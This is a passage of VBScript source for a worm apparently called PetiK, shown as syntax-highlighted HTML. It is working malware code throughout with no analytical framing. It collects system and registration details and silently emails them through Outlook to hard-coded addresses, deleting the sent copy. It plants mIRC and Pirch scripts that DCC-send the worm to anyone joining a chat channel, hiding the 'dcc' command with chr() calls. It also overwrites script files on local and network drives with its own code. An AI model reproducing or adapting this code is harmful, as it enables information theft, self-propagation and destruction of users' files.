</span><span class="sc7">SYSDIR</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">TMPDIR</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">msg2.BCC</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"petik@caramail.com;ppetik@hotmail.com"</span><span class="sc0">
</span><span class="sc7">msg2.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Message pour PetiK de "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">NOM</span><span class="sc0">
</span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"-Information :"</span><span class="sc0">
</span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Date : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc3">date</span><span class="sc0">
</span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Heure : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">time</span><span class="sc0">
</span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"NOM DE L'ORDINATEUR : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">ComputerName</span><span class="sc0">
</span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"ENTREPRISE : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">ENT</span><span class="sc0">
</span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"PAYS : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">PAYS</span><span class="sc0">
</span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"SYSTEME D'EXPLOITATION : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VER</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">NUM</span><span class="sc0">
</span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"NUMERO D'IDENTIFICATION : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">REC1</span><span class="sc0">
</span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"NUMERO D'ENREGISTREMENT : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">REC2</span><span class="sc0">
</span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"PAGE DE DEMARRAGE : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">PDEM</span><span class="sc0">
</span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"DOSSIER DE TELECHARGEMENT : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DDIR</span><span class="sc0">
</span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"DOSSIER WINDOWS : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">WINDIR</span><span class="sc0">
</span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"DOSSIER SYSTEME : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">SYSDIR</span><span class="sc0">
</span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"DOSSIER TEMPORAIRE : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">TMPDIR</span><span class="sc0">
</span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">m2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"DOSSIER PROGRAM FILES : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">PFD</span><span class="sc0">
</span><span class="sc7">msg2.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">m2</span><span class="sc0">
</span><span class="sc7">msg2.DeleteAfterSubmit</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc7">msg2.Send</span><span class="sc0">
</span><span class="sc7">Outlook.Quit</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKLM\Software\PetiK\"</span><span class="sc6">,</span><span class="sc4">"OK"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Mirc</span><span class="sc6">(</span><span class="sc7">Path</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'On Error Resume Next
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">fso.FileExists</span><span class="sc6">(</span><span class="sc4">"c:\mirc\mirc.ini"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"c:\mirc"</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">fso.FileExists</span><span class="sc6">(</span><span class="sc4">"c:\mirc32\mirc.ini"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"c:\mirc32"</span><span class="sc0">
</span><span class="sc7">PFD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.regread</span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">PK2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.regread</span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\PetiK"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">fso.FileExists</span><span class="sc6">(</span><span class="sc7">PFD</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\mirc\mirc.ini"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">PFD</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\mirc"</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">fso.FileExists</span><span class="sc6">(</span><span class="sc7">PFD</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\mirc32\mirc.ini"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">PFD</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\mirc"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Script</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.CreateTextFile</span><span class="sc6">(</span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\script.ini"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Script.writeline</span><span class="sc0"> </span><span class="sc4">"[script]"</span><span class="sc0">
</span><span class="sc7">Script.writeline</span><span class="sc0"> </span><span class="sc4">"n0=on 1:JOIN:#:{"</span><span class="sc0">
</span><span class="sc7">Script.writeline</span><span class="sc0"> </span><span class="sc4">"n1=  /if ( $nick == $me ) { halt }"</span><span class="sc0">
</span><span class="sc7">Script.writeline</span><span class="sc0"> </span><span class="sc4">"n2=  /."</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">chr</span><span class="sc6">(</span><span class="sc2">100</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">chr</span><span class="sc6">(</span><span class="sc2">99</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">chr</span><span class="sc6">(</span><span class="sc2">99</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" send $nick "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">PK2</span><span class="sc0">
</span><span class="sc7">Script.writeline</span><span class="sc0"> </span><span class="sc4">"n3=}"</span><span class="sc0">
</span><span class="sc7">Script.Close</span><span class="sc0">
</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKLM\Software\PetiK\MIRC"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"OK"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Pirch</span><span class="sc6">(</span><span class="sc7">path</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"scripting.filesystemobject"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ws</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"wscript.shell"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">fso.FileExists</span><span class="sc6">(</span><span class="sc4">"c:\pirch\Pirch32.exe"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"c:\pirch"</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">fso.FileExists</span><span class="sc6">(</span><span class="sc4">"c:\pirch32\Pirch32.exe"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"c:\pirch32"</span><span class="sc0">
</span><span class="sc7">pfDir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.regread</span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">PK3</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.regread</span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\PetiK"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">fso.FileExists</span><span class="sc6">(</span><span class="sc7">pfDir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\pirch\Pirch32.exe"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">pfDir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\pirch\Pirch32.exe"</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">fso.FileExists</span><span class="sc6">(</span><span class="sc7">pfDir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\pirch32\Pirch32.exe"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">pfDir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\pirch\Pirch32.exe"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">path</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Script</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.CreateTextFile</span><span class="sc6">(</span><span class="sc7">path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\events.ini"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"[Levels]"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"Enabled=1"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"Count=6"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"Level1=000-Unknowns"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"000-UnknownsEnabled=1"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"Level2=100-Level 100"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"100-Level 100Enabled=1"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"Level3=200-Level 200"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"200-Level 200Enabled=1"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"Level4=300-Level 300"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">" 300-Level 300Enabled=1"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"Level5=400-Level 400 "</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"400-Level 400Enabled=1"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"Level6=500-Level 500"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"500-Level 500Enabled=1"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"[000-Unknowns]"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"UserCount=0"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"EventCount=0"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"[100-Level 100]"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"User1=*!*@*"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"UserCount=1"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"Event1=ON JOIN:#:/"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">chr</span><span class="sc6">(</span><span class="sc2">100</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">chr</span><span class="sc6">(</span><span class="sc2">99</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">chr</span><span class="sc6">(</span><span class="sc2">99</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" tsend $nick "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">PK3</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"EventCount=1"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"[200-Level 200]"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"UserCount=0"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"EventCount=0"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"[300-Level 300]"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"UserCount=0"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"EventCount=0"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"[400-Level 400]"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"UserCount=0"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"EventCount=0"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"[500-Level 500]"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"UserCount=0"</span><span class="sc0">
</span><span class="sc7">Script.WriteLine</span><span class="sc0"> </span><span class="sc4">"EventCount=0"</span><span class="sc0">
</span><span class="sc7">Script.Close</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKLM\Software\PetiK\PIRCH"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"OK"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">lecteur</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc6">,</span><span class="sc7">f1</span><span class="sc6">,</span><span class="sc7">fc</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">dr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.Drives</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">d</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">dr</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">d.DriveType</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">d.DriveType</span><span class="sc6">=</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">liste</span><span class="sc6">(</span><span class="sc7">d.path&amp;</span><span class="sc4">"\"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">infecte</span><span class="sc6">(</span><span class="sc7">dossier</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetFolder</span><span class="sc6">(</span><span class="sc7">dossier</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">f.Files</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">f1</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc0">
</span><span class="sc7">ext</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetExtensionName</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">ext</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">lcase</span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"vbs"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"vbe"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ap</span><span class="sc6">=</span><span class="sc7">fso.OpenTextFile</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">,</span><span class="sc2">2</span><span class="sc6">,</span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">ap.Write</span><span class="sc0"> </span><span class="sc7">vbscopie</span><span class="sc0">
</span><span class="sc7">ap.Close</span><span class="sc0">
</span><span class="sc3">elseif</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"js"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"jse"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ap</span><span class="sc6">=</span><span class="sc7">fso.OpenTextFile</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">,</span><span class="sc2">2</span><span class="sc6">,</span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">ap.Write</span><span class="sc0"> </span><span class="sc7">vbscopie</span><span class="sc0">
</span><span class="sc7">ap.Close</span><span class="sc0">
</span><span class="sc7">bn</span><span class="sc6">=</span><span class="sc7">fso.GetBaseName</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">cop</span><span class="sc6">=</span><span class="sc7">fso.GetFile</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">cop.Copy</span><span class="sc6">(</span><span class="sc7">dossier&amp;</span><span class="sc4">"\"</span><span class="sc6">&amp;</span><span class="sc7">bn&amp;</span><span class="sc4">".vbs"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">fso.DeleteFile</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">)</span><span class="sc0">
